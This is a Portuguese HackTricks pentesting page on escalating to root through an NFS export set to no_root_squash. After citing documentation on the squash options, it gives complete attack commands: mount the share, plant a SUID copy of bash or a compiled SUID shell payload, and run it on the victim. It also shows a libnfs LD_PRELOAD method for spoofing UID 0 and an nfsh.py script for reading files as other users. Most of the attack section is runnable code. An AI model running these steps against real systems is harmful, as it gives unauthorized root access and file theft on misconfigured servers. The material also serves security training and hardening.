# Escalação de Privilégios por Misconfiguration de NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas sobre Squashing

Com NFS AUTH_SYS/AUTH_UNIX, o servidor baseia as verificações de permissões de arquivos no `uid` e `gid` fornecidos em cada solicitação RPC. Outros security flavors, como Kerberos, usam credenciais diferentes, e o servidor pode mapear credenciais numéricas antes de verificar as permissões.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mapeia todos os UID e GID para a conta anônima, que por padrão é `nobody` (65534) no Linux. `no_all_squash` é o padrão para solicitações que não são de root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Esse é o padrão no Linux e mapeia solicitações com UID/GID 0 (root) para a conta anônima; outros UID e GID não sofrem squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Desabilita o root squashing, permitindo que solicitações com UID/GID 0 sejam avaliadas como root no servidor.<sup>[[4]](#references)</sup>

Se um client autorizado puder montar um export com permissão de escrita em **`/etc/exports`** configurado com **`no_root_squash`**, suas solicitações com UID/GID 0 poderão escrever nesse local como o usuário root do servidor.<sup>[[4]](#references)</sup>

Para mais informações sobre **NFS**, confira:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Escalação de Privilégios

### Exploit Remoto

Opção 1 usando bash:
- Em um client autorizado, monte um export com permissão de escrita como root, copie **`/bin/bash`** para ele, defina seu bit **SUID** e execute-o a partir de um mount da vítima que não use `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Para que o arquivo enviado continue pertencendo a root, o servidor deve usar **`no_root_squash`**. Se root sofrer squash, um binário SUID para outra conta só será possível quando o client puder criá-lo ou ser legitimamente seu proprietário usando o UID/GID numérico dessa conta.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opção 2 usando código C compilado:
- Monte o diretório a partir de um client permitido, copie um payload compilado que abuse das permissões SUID, defina seu bit **SUID** e execute-o a partir da vítima (consulte alguns [payloads SUID em C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Mesmas restrições de antes
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Exploit Local

> [!TIP]
> Observe que, se você puder criar um **túnel da sua máquina para a máquina vítima, ainda poderá usar a versão Remote para explorar essa escalada de privilégios, tunelando as portas necessárias**.\
> O truque a seguir é útil quando `/etc/exports` restringe a exportação ao IP da vítima: o cliente remoto não pode montá-la, mas a técnica local pode operar por meio do compartilhamento já montado no host permitido.<sup>[[2]](#references)</sup>\
> Para este método libnfs sem privilégios, a exportação em **`/etc/exports`** deve usar a flag `insecure` para que o processo possa usar uma porta de origem não reservada; `secure` é o padrão, embora um processo capaz de associar-se a uma porta reservada não precise dessa opção.<sup>[[1]](#references)[[4]](#references)</sup>

### Informações Básicas

Um cliente NFSv3 AUTH_UNIX inclui seu UID, GID e grupos efetivos em cada chamada, e o servidor os utiliza para verificar permissões. Esta técnica local explora esse modelo forjando as credenciais RPC por meio do [libnfs](https://github.com/sahlberg/libnfs); seu módulo preload permite substituir o UID/GID no contexto NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compilando a Biblioteca

O exemplo do libnfs pode exigir ajustes para o kernel de destino; o walkthrough usado aqui observa especificamente que é necessário comentar as chamadas de sistema fallocate antes de compilar o módulo preload.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Executando o Exploit

O exemplo cria um pequeno helper em C que inicia um shell, depois o coloca no share e usa `ld_nfs.so` com UID 0 no contexto do NFS para torná-lo SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compile o código do exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Coloque o exploit no compartilhamento e modifique suas permissões falsificando o UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Execute o exploit para obter privilégios de root**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bônus: NFShell para Acesso Discreto a Arquivos

Depois de obter acesso root, este padrão `nfsh.py` define o UID efetivo como o UID do arquivo-alvo antes de executar um comando, permitindo o acesso sem alterar recursivamente a propriedade.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Execute assim:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Um relato sobre uma técnica de privesc do NFS menos conhecida](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — página de manual do Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Especificação do protocolo NFS versão 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
